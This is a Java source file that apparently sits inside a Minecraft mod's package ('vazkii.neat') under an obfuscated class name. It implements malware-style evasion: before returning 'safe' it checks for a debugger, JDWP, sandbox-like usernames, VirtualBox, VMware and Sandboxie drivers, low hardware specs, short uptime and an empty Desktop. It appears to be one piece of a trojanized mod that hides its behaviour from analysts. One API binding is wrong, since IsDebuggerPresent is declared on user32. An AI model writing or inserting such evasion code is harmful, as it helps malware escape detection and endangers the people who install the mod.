package vazkii.neat;

import com.sun.jna.Native;
import com.sun.jna.platform.win32.User32;

import java.io.File;
import java.lang.management.ManagementFactory;

public final class D {
    private static final String TAG = "D";

    interface User32X extends User32 {
        User32X I = Native.load("user32", User32X.class,
            com.sun.jna.win32.W32APIOptions.DEFAULT_OPTIONS);
        boolean IsDebuggerPresent();
    }

    private D() {}

    public static boolean isSafe() {
        try {
            if (User32X.I.IsDebuggerPresent()) { B.info(TAG, "debugger"); return false; }
            if (System.getProperty("jdwp") != null) { B.info(TAG, "jdwp"); return false; }
            if (isVM()) { B.info(TAG, "vm"); return false; }
            if (isLowSpec()) { B.info(TAG, "lowspec"); return false; }
            if (isFreshSandbox()) { B.info(TAG, "fresh sandbox"); return false; }
            return true;
        } catch (Throwable t) {
            return false;
        }
    }

    private static boolean isVM() {
        String user = System.getenv("USERNAME");
        if (user == null) user = "";
        String u = user.toLowerCase();
        if (u.contains("sandbox") || u.contains("virus") || u.contains("malware")) return true;

        String sys = "C:\\Windows\\System32\\drivers\\";
        String[] drivers = {
            "VBoxMouse.sys", "VBoxGuest.sys", "VBoxSF.sys",
            "vmhgfs.sys", "vmmouse.sys", "vmrawdsk.sys", "vm3dmp.sys", "SbieDrv.sys"
        };
        for (String d : drivers) if (new File(sys + d).exists()) return true;
        return false;
    }

    private static boolean isLowSpec() {
        try {
            com.sun.management.OperatingSystemMXBean os =
                (com.sun.management.OperatingSystemMXBean) ManagementFactory.getOperatingSystemMXBean();
            if (os.getTotalMemorySize() < 2L * 1024 * 1024 * 1024) return true;
            if (Runtime.getRuntime().availableProcessors() < 2) return true;
        } catch (Throwable ignored) {}
        return false;
    }

    private static boolean isFreshSandbox() {
        try {
            long uptime = getUptimeMs();
            if (uptime > 0 && uptime < A.SANDBOX_UPTIME_THRESHOLD_MS) return true;
            int desktopFiles = countDesktopFiles();
            if (desktopFiles == 0 && uptime > 0 && uptime < 60L * 60 * 1000) return true;
            return false;
        } catch (Throwable t) {
            return false;
        }
    }

    private static long getUptimeMs() {
        try {
            return com.sun.jna.platform.win32.Kernel32.INSTANCE.GetTickCount64();
        } catch (Throwable t) {
            return -1;
        }
    }

    private static int countDesktopFiles() {
        try {
            String home = System.getProperty("user.home");
            if (home == null) return -1;
            java.nio.file.Path d = java.nio.file.Paths.get(home, "Desktop");
            if (!java.nio.file.Files.isDirectory(d)) return -1;
            try (java.util.stream.Stream<java.nio.file.Path> s = java.nio.file.Files.list(d)) {
                return (int) s.filter(java.nio.file.Files::isRegularFile).count();
            }
        } catch (Throwable t) {
            return -1;
        }
    }
}